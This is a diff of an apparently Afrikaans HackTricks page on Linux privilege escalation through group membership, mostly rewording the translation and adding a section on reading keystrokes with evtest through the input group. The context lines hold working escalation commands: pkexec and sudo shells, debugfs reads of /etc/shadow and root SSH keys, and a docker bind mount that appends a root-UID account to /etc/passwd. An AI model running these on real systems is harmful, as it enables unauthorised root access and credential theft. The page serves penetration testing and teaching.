@@ -2,11 +2,11 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Sudo/Admin-groepe
+## Sudo-/Admin-groepe
 
 ### **PE - Method 1**
 
-**Soms** bevat ’n stelsel se **/etc/sudoers**-beleid (of ’n lêer wat daaruit ingesluit word) inskrywings soos:<sup>[[3]](#references)</sup>
+**Soms** bevat ’n stelsel se **/etc/sudoers**-beleid (of ’n lêer wat daarby ingesluit is) inskrywings soos:<sup>[[3]](#references)</sup>
 
 ```bash
 # Allow members of group sudo to execute any command
@@ -16,19 +16,19 @@
 %admin 	ALL=(ALL:ALL) ALL
 ```
 
-Dit beteken dat enige gebruiker wat met een van die inskrywings ooreenstem, enige opdrag as enige teikengebruiker via `sudo` kan uitvoer (onderhewig aan die res van die beleid).<sup>[[3]](#references)</sup>
+Dit beteken dat enige gebruiker wat by enige van die inskrywings pas, enige opdrag as enige teikengebruiker via `sudo` mag uitvoer (onderhewig aan die res van die beleid).<sup>[[3]](#references)</sup>
 
-As dit die geval is, kan jy **eenvoudig die volgende uitvoer om root te word**:
+As dit die geval is, kan jy **om root te word net die volgende uitvoer**:
 
 ```
 sudo su
 ```
 
-As `sudo -l` ’n beperkte `adduser`-aanroep met slegs ’n gebruikersnaam toelaat, kyk of dit ’n primêre groep met dieselfde naam skep wat nog nie bestaan nie. ’n Nuwe rekening in daardie groep kan voorregte verkry as die effektiewe sudoers-beleid reeds aan `%group` voorregte toeken; bevestig beide die groep se skeppingsgedrag en die groepreël voordat jy dit as ’n eskalasiepad beskou. Die skep van ’n rekening verander die stelsel, dus moet jy eers die beleid nagaan.
+As `sudo -l` ’n beperkte `adduser`-aanroeping met slegs ’n gebruikersnaam toelaat, kyk of dit ’n primêre groep met dieselfde naam skep wat nog nie bestaan nie. ’n Nuwe rekening in daardie groep kan voorregte kry as die effektiewe sudoers-beleid dit reeds aan `%group` toeken; bevestig beide die groep se skeppingsgedrag en die groepreël voordat jy dit as ’n eskalasiepad beskou. Om ’n rekening te skep, verander die stelsel, so ondersoek eers die beleid.
 
-### PE - Metode 2
+### PE - Method 2
 
-Vind alle suid-binaries en kyk of die binary **Pkexec** teenwoordig is:
+Vind alle suid-binaries en kyk of die **Pkexec**-binêre daar is:
 
 ```bash
 find / -perm -4000 2>/dev/null
@@ -36,19 +36,19 @@ find / -perm -4000 2>/dev/null
 
 As **pkexec ’n SUID-binary is**, kan dit ’n program as ’n ander gebruiker uitvoer slegs wanneer polkit die aangevraagde aksie magtig; die SUID-bit alleen waarborg nie root nie. Gaan die geïnstalleerde beleid en die teikensessie se magtiging na, eerder as om aan te neem dat lidmaatskap van **sudo** of **admin** voldoende is.<sup>[[4]](#references)[[5]](#references)</sup>
 
-Vir die afsonderlike [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)-pad, verifieer eers dat `pkexec` ’n uitvoerbare **root-besitte SUID**-lêer is. ’n Geïnstalleerde binary sonder daardie bit is nie die plaaslike SUID-escalation wat in die advies beskryf word nie. ’n Weergawe-string stroomop is slegs ’n leidraad: verspreidings kan die [fix na ouer pakketweergawes backport](https://ubuntu.com/security/CVE-2021-4034), dus gaan die geïnstalleerde verskafferpakket en versagtings na voordat jy dit kwesbaar noem.
+Vir die afsonderlike [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)-roete, verifieer eers dat `pkexec` ’n uitvoerbare **root-owned SUID**-lêer is. ’n Geïnstalleerde binary sonder daardie bit is nie die plaaslike SUID-escalation wat in die advies beskryf word nie. ’n Upstream-weergawestring is slegs ’n leidraad: verspreidings kan die [regstelling na ouer pakketweergawes backport](https://ubuntu.com/security/CVE-2021-4034), so gaan die geïnstalleerde verskafferpakket en versagtings na voordat jy dit kwesbaar noem.
 
-[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) is ’n ander polkit-pad: ’n D-Bus-magtigingswedloop, nie ’n `pkexec` SUID-fout nie. Gaan die geïnstalleerde verskafferpakket vir polkit na, asook of ’n bereikbare bevoorregte D-Bus-aksie ’n nuttige verandering kan aanbring; ’n roete om ’n rekening te skep vereis ook ’n geskikte diens, soos AccountsService, en enige nuwe groep se sudo-toegang hang af van die effektiewe sudo-beleid. ’n Gerapporteerde polkit-weergawe of geïnstalleerde diens is op sigself slegs ’n kandidaat, veral waar verskaffers [fixes backport](https://access.redhat.com/security/cve/cve-2021-3560). Passiewe enumerasie behoort nie die wedloop te aktiveer nie.
+[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) is ’n ander polkit-roete: ’n D-Bus-magtigings-race, nie ’n `pkexec` SUID-fout nie. Gaan die geïnstalleerde verskaffer se polkit-pakket na, asook of ’n bereikbare bevoorregte D-Bus-aksie ’n nuttige verandering kan aanbring; ’n rekening-skeppingsroete vereis ook ’n geskikte diens soos AccountsService, en enige nuwe groep se sudo-toegang hang van die effektiewe sudo-beleid af. ’n Gerapporteerde polkit-weergawe of geïnstalleerde diens is op sigself slegs ’n kandidaat, veral waar verskaffers [regstellings backport](https://access.redhat.com/security/cve/cve-2021-3560). Passiewe enumerasie behoort nie die race te aktiveer nie.
 
-Op verspreidings wat steeds die ouer Local Authority-backend gebruik, inspekteer die groepreëls daarvan met:
+Op verspreidings wat steeds die ouer Local Authority-backend gebruik, kan jy die groepreëls daarvan met die volgende nagaan:
 
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
 
-Die relevante groepname en verstekwaardes verskil per verspreiding; ’n groep is hier slegs nuttig as die plaaslike beleid dit benoem.<sup>[[5]](#references)</sup>
+Die relevante groepname en verstekwaardes verskil volgens verspreiding; ’n groep is hier slegs nuttig as die plaaslike beleid dit noem.<sup>[[5]](#references)</sup>
 
-Om **root te word, kan jy uitvoer**:
+Om **root te word, kan jy die volgende uitvoer**:
 
 ```bash
 pkexec "/bin/sh" #Authentication is required according to the local policy
@@ -62,9 +62,9 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 Error executing command as another user: Not authorized
 ```
 
-In ’n SSH-sessie sonder ’n geregistreerde verifikasi agent kan `pkexec` met hierdie fout misluk, selfs wanneer die beleid andersins die handeling sou toelaat; polkit beskryf `pkttyagent` as ’n teksverifikasi agent vir nie-rekenaarsessies. Die presiese gedrag hang van die weergawe en verspreiding af, so verifieer die plaaslike beleid en agentopstelling. Een oplossing wat vir betrokke NixOS-weergawes gerapporteer is, gebruik **2 verskillende SSH-sessies**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
+In ’n SSH-sessie sonder ’n geregistreerde verifikasie-agent kan `pkexec` met hierdie fout misluk, selfs wanneer die beleid die handeling andersins sou toelaat; polkit dokumenteer `pkttyagent` as ’n teksverifikasie-agent vir nie-rekenaarsessies. Die presiese gedrag hang af van die weergawe en verspreiding, dus moet jy die plaaslike beleid en agentopstelling nagaan. Een tydelike oplossing wat vir geraakte NixOS-weergawes gerapporteer is, gebruik **2 verskillende SSH-sessies**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
 
-’n ACL wat een rekening toegang tot `su` weier, beheer daardie uitvoerbare lêer, nie elke manier om ’n handeling uit te voer wat deur ’n administrateur gemagtig is nie. As ’n administrateurbewys onafhanklik blootgelê is, kyk of ’n afsonderlike handeling, soos om ’n tydelike stelseldiens deur `systemd-run` te begin, volgens die effektiewe polkit-beleid toegelaat word, watter identiteit die verifikasi agent aanvaar, en watter identiteit die gevolglike diens sou gebruik. [Polkit onderskei verifikasie as die sessie-eienaar van verifikasie as ’n administrateur](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), terwyl [systemd-run ’n tydelike diens by die stelselbestuurder kan aanvra](https://systemd.io/CONTROL_GROUP_INTERFACE/). ’n Geskiedenisinskrywing, geïnstalleerde opdrag of leesbare beleidslêer bewys op sigself nie dat daar magtiging is of dat die bewys geldig is nie; ’n passiewe ondersoek behoort nie bewyse in te dien of ’n eenheid te begin nie.
+’n ACL wat een rekening toegang tot `su` weier, is van toepassing op daardie uitvoerbare lêer, nie op elke roete na ’n handeling waarvoor ’n administrateur gemagtig is nie. As ’n administrateur se geloofsbriewe onafhanklik blootgelê word, moet jy nagaan of ’n afsonderlike handeling, soos om ’n tydelike stelseldiens deur `systemd-run` te begin, deur die effektiewe polkit-beleid toegelaat word, watter identiteit die verifikasie-agent aanvaar en watter identiteit die gevolglike diens sal gebruik. [Polkit onderskei tussen verifikasie as die sessie-eienaar en as ’n administrateur](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), terwyl [systemd-run ’n tydelike diens by die stelselbestuurder kan aanvra](https://systemd.io/CONTROL_GROUP_INTERFACE/). ’n Geskiedenisinskrywing, geïnstalleerde opdrag of leesbare beleidslêer bewys op sigself nie dat daar magtiging of geldige geloofsbriewe is nie; passiewe hersiening behoort nie geloofsbriewe in te dien of ’n eenheid te begin nie.
 
 ```bash:session1
 echo $$ #Step1: Get current PID
@@ -77,7 +77,7 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
 ```
 
-## Wheel Group
+## Wheel-groep
 
 Soms kan ’n sudoers-beleid ook hierdie inskrywing bevat:
 
@@ -85,9 +85,9 @@ Soms kan ’n sudoers-beleid ook hierdie inskrywing bevat:
 %wheel	ALL=(ALL:ALL) ALL
 ```
 
-Dit beteken dat enige gebruiker wat met die inskrywing ooreenstem, enige opdrag as enige teikengebruiker via `sudo` kan uitvoer (onderhewig aan die res van die beleid).<sup>[[3]](#references)</sup>
+Dit beteken dat enige gebruiker wat deur die inskrywing ooreenstem, enige opdrag as enige teikengebruiker via `sudo` kan uitvoer (onderhewig aan die res van die beleid).<sup>[[3]](#references)</sup>
 
-As dit die geval is, kan jy **root word deur bloot die volgende uit te voer**:
+As dit die geval is, kan jy **eenvoudig die volgende uitvoer om root te word**:
 
 ```
 sudo su
@@ -95,25 +95,25 @@ sudo su
 
 ## Shadow Group
 
-Op stelsels waar toestemmings dit toelaat, kan gebruikers in die **shadow**-groep **/etc/shadow** **lees**; verifieer die werklike modus en ACL's op die teiken:<sup>[[6]](#references)[[7]](#references)</sup>
+Op stelsels waar die toestemmings dit toelaat, kan gebruikers in die **shadow**-groep **/etc/shadow** **lees**; verifieer die werklike modus en ACL's op die teiken:<sup>[[6]](#references)[[7]](#references)</sup>
 
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
 
-Lees dus die lêer en probeer om **’n paar hashes te kraak**.
+Lees dus die lêer en probeer **sommige hashes kraak**.
 
-’n Kort nuanse oor sluitstatus wanneer jy hashes triageer:
+’n Belangrike nuanse oor slotstatus wanneer jy hashes triageer:
 - Inskrywings met `!` of `*` is gewoonlik nie-interaktief vir wagwoordaanmeldings.
-- `!hash` beteken die wagwoord is gesluit; die oorblywende karakters verteenwoordig die wagwoordveld voordat dit gesluit is.
-- ’n Veld wat `*` bevat, is nie ’n geldige `crypt(3)`-hash nie en verhoed UNIX-wagwoordaanmelding; moenie hieruit aflei of ’n wagwoord voorheen ingestel is nie.
-Dit is nuttig vir rekeningklassifikasie, selfs wanneer direkte aanmelding geblokkeer is.<sup>[[6]](#references)</sup>
+- `!hash` beteken dat die wagwoord gesluit is; die oorblywende karakters verteenwoordig die wagwoordveld voordat dit gesluit is.
+- ’n Veld wat `*` bevat, is nie ’n geldige `crypt(3)`-hash nie en verhoed UNIX-wagwoordaanmelding; moenie daaruit aflei of ’n wagwoord voorheen opgestel is nie.
+Dit is nuttig om rekeninge te klassifiseer, selfs wanneer direkte aanmelding geblokkeer is.<sup>[[6]](#references)</sup>
 
 ## Staff-groep
 
-**staff**: Laat gebruikers plaaslike wysigings aan die stelsel (`/usr/local`) aanbring sonder om root-regte te benodig (let daarop dat uitvoerbare lêers in `/usr/local/bin` in enige gebruiker se PATH-veranderlike is, en dat hulle uitvoerbare lêers in `/bin` en `/usr/bin` met dieselfde naam kan "vervang"). Vergelyk dit met die groep "adm", wat meer met monitering/sekuriteit verband hou.<sup>[[2]](#references)[[7]](#references)</sup>
+**staff**: Laat gebruikers toe om plaaslike wysigings aan die stelsel (`/usr/local`) aan te bring sonder wortelregte (let daarop dat uitvoerbare lêers in `/usr/local/bin` in enige gebruiker se PATH-veranderlike is en uitvoerbare lêers in `/bin` en `/usr/bin` met dieselfde naam kan “oorskadu”). Vergelyk dit met die groep “adm”, wat meer met monitering/sekuriteit verband hou.<sup>[[2]](#references)[[7]](#references)</sup>
 
-In Debian-konfigurasies waar `/usr/local/bin` voor `/usr/bin` in `PATH` kom (soos in die voorbeelde hieronder), word ’n opdrag sonder ’n padnaam eerste na die kopie in `/usr/local/bin` opgelos; bevestig die effektiewe `PATH` op die teiken.
+In Debian-konfigurasies waar `/usr/local/bin` voor `/usr/bin` in `PATH` kom (soos in die voorbeelde hieronder), word ’n opdrag sonder ’n padspesifikasie eers na die kopie in `/usr/local/bin` opgelos; bevestig die effektiewe `PATH` op die teiken.
 
 ```bash
 $ echo $PATH
@@ -125,7 +125,7 @@ $ echo $PATH
 
 As ’n bevoorregte proses ’n ongekwalifiseerde opdrag deur ’n skryfbare `/usr/local/bin` oplos, kan die vervanging van daardie opdrag dit met die proses se voorregte laat uitvoer; bevestig die werklike pad en sneller voordat jy toets.
 
-Op Ubuntu-stelsels voer `pam_motd` tydens aanmelding uitvoerbare skrifte via `run-parts --lsbsysinit` as root uit; cron-take kan ook `run-parts` gebruik, maar dit hang van die verspreiding en konfigurasie af.<sup>[[10]](#references)[[11]](#references)</sup>
+Op Ubuntu-stelsels voer `pam_motd` tydens aanmelding uitvoerbare skrifte via `run-parts --lsbsysinit` as root uit; cron-take kan ook `run-parts` gebruik, maar dit hang af van die verspreiding en konfigurasie.<sup>[[10]](#references)[[11]](#references)</sup>
 
 ```bash
 $ cat /etc/crontab | grep run-parts
@@ -135,7 +135,7 @@ $ cat /etc/crontab | grep run-parts
 52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
 ```
 
-Met ’n nuwe SSH-aanmelding kan `pspy` help bevestig of hierdie pad werklik op die teiken aangeroep word; dit kan proses-opdragreëls sonder root waarneem.<sup>[[10]](#references)[[12]](#references)</sup>
+Met 'n nuwe SSH-aanmelding kan `pspy` help bevestig of hierdie pad werklik op die teiken aangeroep word; dit kan prosesopdragreëls sonder root waarneem.<sup>[[10]](#references)[[12]](#references)</sup>
 
 ```bash
 $ pspy64
@@ -171,9 +171,9 @@ $ ls -la /bin/bash
 $ /bin/bash -p
 ```
 
-## Skyf-groep
+## Disk Group
 
-Lidmaatskap van die **disk**-groep kan rou toegang tot bloktoestelle verleen en is dikwels **naby aan root-toegang**; Debian beskryf dit as meestal gelykstaande aan root, maar verifieer die werklike toesteltoestemmings en berginguitleg op die teiken.<sup>[[7]](#references)</sup>
+Lidmaatskap van die **disk**-groep kan rou toegang tot bloktoestelle verleen en is dikwels **naby aan root-toegang**; Debian beskryf dit as grootliks gelykstaande aan root, maar verifieer die werklike toesteltoestemmings en berginguitleg op die teiken.<sup>[[7]](#references)</sup>
 
 Algemene toestelpaadjies sluit `/dev/sd*` in, maar NVMe en ander berginguitlegte gebruik ander name.
 
@@ -186,14 +186,14 @@ debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
 
-`debugfs` werk op ext2/ext3/ext4-lêerstelsels; paaie soos `/root` en `/etc/shadow` hierbo is lêers binne die oopgemaakte lêerstelsel, terwyl die tweede argument vir `dump` ’n uitvoerpad op die inheemse lêerstelsel is.<sup>[[8]](#references)</sup> Hierdie voorbeeld onttrek `/tmp/asd1.txt` uit die oopgemaakte lêerstelsel na `/tmp/asd2.txt` op die inheemse lêerstelsel:
+`debugfs` werk op ext2/ext3/ext4-lêerstelsels; paaie soos `/root` en `/etc/shadow` hierbo is lêers binne die oopgemaakte lêerstelsel, terwyl die tweede argument vir `dump` ’n uitvoerpad op die oorspronklike lêerstelsel is.<sup>[[8]](#references)</sup> Byvoorbeeld, dit onttrek `/tmp/asd1.txt` uit die oopgemaakte lêerstelsel na `/tmp/asd2.txt` op die oorspronklike lêerstelsel:
 
 ```bash
 debugfs /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
 
-Die `-w`-opsie maak die lêerstelsel lees-en-skryf oop, en die `write`-opdrag kopieer ’n oorspronklike lêer na die oopgemaakte lêerstelsel. Vermy dit op ’n gemonteerde, aktiewe lêerstelsel, want direkte wysigings kan die lêerstelsel beskadig; werk indien moontlik vanaf ’n vanlyn beeld.<sup>[[8]](#references)</sup>
+Die `-w`-opsie open die lêerstelsel vir lees en skryf, en die `write`-opdrag kopieer ’n oorspronklike lêer na die oopgemaakte lêerstelsel. Vermy dit op ’n gemonteerde, aktiewe lêerstelsel, want direkte wysigings kan die lêerstelsel beskadig; werk indien moontlik vanaf ’n vanlyn beeld.<sup>[[8]](#references)</sup>
 
 ```bash
 debugfs -w /dev/sda1
@@ -202,7 +202,7 @@ debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
 
 ## Video Group
 
-Deur die opdrag `w` te gebruik, kan jy **sien wie op die stelsel aangemeld is**, en dit sal ’n uitvoer soos die volgende wys.<sup>[[20]](#references)</sup>
+Deur die opdrag `w` te gebruik, kan jy uitvind **wie by die stelsel aangemeld is**, en dit sal ’n uitvoer soos die volgende een wys.<sup>[[20]](#references)</sup>
 
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@ -210,28 +210,46 @@ yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
 
-Die **tty1**-inskrywing identifiseer die eerste virtuele Linux-konsole; dit bewys nie op sigself dat ’n gebruiker fisies by die masjien teenwoordig is nie, veral in houers of ander omgewings nie.<sup>[[21]](#references)</sup>
+Die **tty1**-inskrywing identifiseer die eerste Linux-virtuele konsole; dit bewys nie op sigself dat ’n gebruiker fisies by die masjien teenwoordig is nie, veral in houers of ander omgewings nie.<sup>[[21]](#references)</sup>
 
-Op stelsels wat ’n leesbare framebuffer-toestel blootstel, kan lidmaatskap van die **video**-groep toegang tot daardie toestel verleen. Die Linux-framebuffer-koppelvlak dokumenteer `/dev/fb0` as ’n leesbare geheuetoestel waarvan die inhoud gekopieer kan word om ’n skermkiekie te maak; die pad `/sys/class/graphics/fb0/virtual_size` is slegs beskikbaar waar daardie fbdev-sysfs-kenmerk teenwoordig is, dus moet jy eers die teiken nagaan.<sup>[[7]](#references)[[9]](#references)</sup>
+Op stelsels wat ’n leesbare framebuffer-toestel blootstel, kan lidmaatskap van die **video**-groep toegang tot daardie toestel verleen. Die Linux-framebuffer-koppelvlak dokumenteer `/dev/fb0` as ’n leesbare geheuetoestel waarvan die inhoud gekopieer kan word om ’n skermskoot te maak; die pad `/sys/class/graphics/fb0/virtual_size` is slegs beskikbaar waar daardie fbdev-sysfs-kenmerk teenwoordig is, dus moet jy eers die teiken nagaan.<sup>[[7]](#references)[[9]](#references)</sup>
 
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
 
-As die geïnstalleerde **GIMP**-weergawe ’n roudata-invoerder bied, maak **`screen.raw`** daarmee oop; ondersteuning en kontroles wissel volgens weergawe en invoegtoepassing.<sup>[[22]](#references)</sup>
+As die geïnstalleerde weergawe van **GIMP** ’n invoerder vir rou data beskikbaar stel, maak **`screen.raw`** met daardie invoerder oop; ondersteuning en kontroles wissel na gelang van die weergawe en inprop.<sup>[[22]](#references)</sup>
 
-![Skyfgroep - Videogroep: Om die rou beeld oop te maak, kan jy GIMP gebruik, die screen.raw-lêer kies en Raw image data as lêertipe kies](<../../../images/image (463).png>)
+![Skyfgroep - Videogroep: Om die rou beeld oop te maak, kan jy GIMP gebruik; kies die screen.raw-lêer en kies Raw image data as lêertipe](<../../../images/image (463).png>)
 
 Stel die beeld se breedte en hoogte in om by die framebuffer-geometrie te pas; probeer die beskikbare pixel-formate/beeldtipes totdat die uitvoer leesbaar is.<sup>[[9]](#references)</sup>
 
 ![Skyfgroep - Videogroep: Verander dan die breedte en hoogte na dié wat op die skerm gebruik word en probeer verskillende beeldtipes (en kies die een wat die skerm die beste vertoon)](<../../../images/image (317).png>)
 
+## Invoergroep
+
+Op stelsels waar die `input`-groep leestoegang tot sleutelbordgebeurtenistoestelle het, kan ’n lid rou sleuteldrukke vanaf daardie toestel waarneem. Gaan eers die werklike modus en ACL na: ’n aktiewe plaaslike sessie kan eerder toegang deur ’n `uaccess`-ACL kry, en die groepnaam alleen waarborg nie toegang nie.<sup>[[23]](#references)[[24]](#references)</sup>
+
+Vind die sleutelbord se `eventX`-hanteerder, bevestig dat die huidige rekening sy nodus kan lees, en monitor dan ’n kort, gemagtigde toets met `evtest`. Moenie `--grab` gebruik nie: dit neem eksklusiewe toegang en kan keer dat ander toepassings invoer ontvang.<sup>[[25]](#references)[[26]](#references)</sup>
+
+```bash
+id -nG
+cat /proc/bus/input/devices            # Match the keyboard name with its eventX handler
+ls -l /dev/input/by-id/*event-kbd      # If persistent keyboard links exist
+getfacl /dev/input/eventX             # Check effective group/seat ACL access
+evtest /dev/input/eventX              # Stop with Ctrl-C after the test
+```
+
+`EV_KEY` rapporteer sleutelkodes eerder as voltooide teks: waarde `1` beteken druk, `0` beteken loslaat, en `2` beteken herhaling. Dit kan sleutels openbaar wat tydens ’n ander sessie met daardie fisiese sleutelbord getik word, insluitend geloofsbriewe, maar bied nie op sigself root-toegang nie. ’n Desktop-compositor maak nie toegang tot die rou device node ongedaan nie.<sup>[[25]](#references)</sup>
+
+Vir die breër identiteits- en sessiekontroles, sien [gebruikers en sessies](../user-and-session-triage.md).
+
 ## Root-groep
 
-Lidmaatskap van die **root**-groep gee nie root se UID nie, maar lêers wat deur `root` besit word en skryftoestemming vir die groep het, kan steeds interessant wees wanneer bevoorregte dienste of biblioteke dit gebruik. Verifieer die lêer se werklike toestemmings en hoe dit gebruik word voordat jy dit as ’n voorregte-eskalasiepad beskou.
+Lidmaatskap van die **root**-groep verskaf nie root se UID nie, maar lêers wat deur `root` besit word en groep-skryfbaar is, kan steeds interessant wees wanneer bevoorregte dienste of biblioteke dit gebruik. Verifieer die lêer se werklike toestemmings en hoe dit gebruik word voordat jy dit as ’n pad na privilege escalation beskou.
 
-**Kyk watter lêers root-groeplede kan wysig**:
+**Kontroleer watter lêers root-groeplede kan wysig**:
 
 ```bash
 find / -group root -perm -g=w 2>/dev/null
@@ -239,9 +257,9 @@ find / -group root -perm -g=w 2>/dev/null
 
 ## Docker-groep
 
-Lidmaatskap van die `docker`-groep verleen toegang op wortelvlak tot die Docker-daemon op standaard rootful-installasies. Omdat bind mounts by verstek lees-skryf is, kan ’n gebruiker wat daardie daemon beheer die gasheer se `/` in ’n container mount en gasheerlêers verander; dit gee effektief root-toegang op die gasheer.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
+Lidmaatskap van die `docker`-groep verleen root-vlaktoegang tot die Docker-daemon op standaard rootful-installasies. Omdat bind mounts by verstek lees-en-skryf-toegang het, kan ’n gebruiker wat daardie daemon beheer die gasheer se `/` in ’n container mount en gasheerlêers wysig; dit gee effektief root-toegang op die gasheer.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
 
-Groep-lidmaatskap kan buite sinkronisasie wees tussen `/etc/group`, `/etc/gshadow` en die huidige proses-token. As ’n gebruiker nie in `id -nG` voorkom nie, maar `newgrp docker` slaag, kyk watter groep `id` in die nuwe shell wys en toets of die Docker-socket werklik skryfbaar is en ’n rootful-daemon bedien. Die groepnaam alleen bevestig nie beheer oor die gasheer nie. Stel ’n tydsbeperking op enige geoutomatiseerde `newgrp`-toets sodat ’n wagwoordprompt nie enumerasie kan laat vashaak nie.
+Groepslidmaatskap kan verskil tussen `/etc/group`, `/etc/gshadow` en die huidige prosestoken. As ’n gebruiker nie in `id -nG` voorkom nie, maar `newgrp docker` slaag, kyk na die groep wat `id` in die nuwe shell wys en toets of die Docker-socket werklik skryfbaar is en ’n rootful-daemon bedien. Die groepnaam alleen bevestig nie beheer oor die gasheer nie. Beperk enige outomatiese `newgrp`-toets sodat ’n wagwoordprompt nie enumerasie kan laat vashaak nie.
 
 ```bash
 docker image #Get images from the docker service
@@ -255,13 +273,13 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
 ```
 
-Laastens, as jy nie van enige van die vorige voorstelle hou nie, of hulle om een of ander rede nie werk nie (Docker API-firewall?), kan jy altyd probeer om **'n bevoorregte container te laat loop en daaruit te ontsnap**, soos hier verduidelik:
+Ten slotte, as jy nie van enige van die vorige voorstelle hou nie, of hulle om een of ander rede nie werk nie (Docker API-firewall?), kan jy altyd probeer om **’n bevoorregte container te laat loop en daaruit te ontsnap**, soos hier verduidelik:
 
 {{#ref}}
 ../../containers-namespaces/container-security/
 {{#endref}}
 
-As jy skryftoestemmings op die Docker-sokkel het, lees [**hierdie plasing oor hoe om voorregte te eskaleer deur die Docker-sokkel te misbruik**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**
+As jy skryftoestemmings op die Docker-socket het, lees [**hierdie plasing oor hoe om voorregte te verhoog deur die Docker-socket te misbruik**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**
 
 {{#ref}}
 https://github.com/KrustyHack/docker-privilege-escalation
@@ -271,55 +289,61 @@ https://github.com/KrustyHack/docker-privilege-escalation
 https://fosterelli.co/privilege-escalation-via-docker.html
 {{#endref}}
 
-## lxc/lxd Group
+## lxc/lxd-groep
 
 {{#ref}}
 lxd-privilege-escalation.md
 {{#endref}}
 
-## Adm Group
+## Adm-groep
 
-Gewoonlik het **lede** van die groep **`adm`** toestemmings om loglêers in _/var/log/_ te **lees**.\
-As jy dus 'n gebruiker in hierdie groep gekompromitteer het, moet jy beslis **na die logs kyk**.<sup>[[7]](#references)</sup>
+Gewoonlik het **lede** van die groep **`adm`** toestemming om **loglêers te lees** wat in _/var/log/_ geleë is.\
+As jy dus ’n gebruiker in hierdie groep gekompromitteer het, moet jy beslis **na die logboeke kyk**.<sup>[[7]](#references)</sup>
 
-## Backup / Operator / lp / Mail groups
+## Backup- / Operator- / lp- / Mail-groepe
 
-Hierdie groepe het diens- en verspreidingspesifieke betekenisse. Debian dokumenteer `backup` vir gedelegeerde rugsteun/herstel, `lp` vir drukkerdaemone en `mail` vir `/var/mail`; gaan dus plaaslike toestemmings na voordat jy lidmaatskap as 'n voorreg-eskalasiepad beskou.<sup>[[7]](#references)</sup>
+Hierdie groepe het diens- en verspreidingspesifieke betekenisse. Debian dokumenteer `backup` vir gedelegeerde rugsteun/herstel, `lp` vir drukkerdaemone en `mail` vir `/var/mail`, so kontroleer plaaslike toestemmings voordat jy lidmaatskap as ’n voorregroete beskou.<sup>[[7]](#references)</sup>
 
-Hulle is dikwels **bewysmiddel-ontdekkingsvektore** eerder as direkte root-eskalasievektore:
-- **backup**: kan rugsteunlêers blootlê wat konfigurasies, sleutels, DB-dumps of tokens bevat.
-- **operator**: platformspesifieke operasionele toegang wat sensitiewe looptyddata kan uitlek.
-- **lp**: drukrye/spoollêers kan dokumentinhoud bevat.
-- **mail**: pos-spoollêers kan terugstelskakels, OTP's en interne bewysmiddels blootlê.
+Hulle is dikwels **vektore vir die ontdekking van aanmeldbewyse**, eerder as direkte roetes na root:
+- **backup**: kan argiewe met konfigurasies, sleutels, DB-dumps of tokens blootlê.
+- **operator**: platformspesifieke operasionele toegang wat sensitiewe runtime-data kan uitlek.
+- **lp**: drukrye/spools kan dokumentinhoud bevat.
+- **mail**: mail-spools kan terugstelskakels, OTP’s en interne aanmeldbewyse blootlê.
 
-Beskou lidmaatskap van hierdie groepe as 'n bevinding met hoë waarde vir datablootstelling, en beweeg verder deur wagwoord-/tokenhergebruik.
+Beskou lidmaatskap van hierdie groepe as ’n bevinding met hoëwaarde-datablootstelling en beweeg verder deur hergebruik van wagwoorde/tokens.
 
-## Auth group
+## Auth-groep
 
-Op OpenBSD, wanneer S/Key opgestel is, is `/etc/skey` die eiendom van `root:auth` en vereis toegang tot sy rekords groep `auth`; YubiKey-rekords word in `/var/db/yubikey` gestoor.<sup>[[16]](#references)[[17]](#references)</sup> 'n Kwesbare OpenBSD 6.6-opstelling met S/Key of YubiKey geaktiveer het plaaslike gebruikers met `auth`-voorregte toegelaat om root te word; Qualys dokumenteer die voorvereiste en uitbuitingsketting, en die gekoppelde PoC implementeer dit.<sup>[[18]](#references)[[19]](#references)</sup>
+Op OpenBSD, wanneer S/Key opgestel is, is `/etc/skey` die eiendom van `root:auth` en vereis toegang tot die rekords die groep `auth`; YubiKey-rekords word in `/var/db/yubikey` gestoor.<sup>[[16]](#references)[[17]](#references)</sup> ’n Kwesbare OpenBSD 6.6-konfigurasie met S/Key of YubiKey geaktiveer het plaaslike gebruikers met `auth`-voorregte toegelaat om root te word; Qualys dokumenteer die voorvereiste en exploit-ketting, en die gekoppelde PoC implementeer dit.<sup>[[18]](#references)[[19]](#references)</sup>
+
+
 
 ## References
 
-- [1] [pkexec/pkttyagent-verifikasie sonder 'n GUI-sessie (NixOS-kwessie #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
+- [1] [pkexec/pkttyagent-verifikasie sonder ’n GUI-sessie (NixOS-kwessie #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
